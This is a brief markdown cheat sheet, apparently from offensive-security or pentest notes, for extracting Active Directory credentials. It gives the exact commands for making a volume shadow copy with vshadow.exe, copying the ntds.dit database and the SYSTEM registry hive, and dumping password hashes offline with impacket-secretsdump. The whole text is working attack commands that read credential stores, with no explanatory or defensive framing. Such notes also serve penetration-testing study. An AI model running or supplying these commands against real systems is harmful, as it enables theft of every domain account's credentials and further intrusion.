# VOLUME SHADOW COPY
#NTDS
#cmd 
```
vshadow.exe -nw -p  C:  # must run cmd as admin

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

reg.exe save hklm\system c:\system.bak

# VOLUME SHADOW COPY
```

#impacket-secretsdump 
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```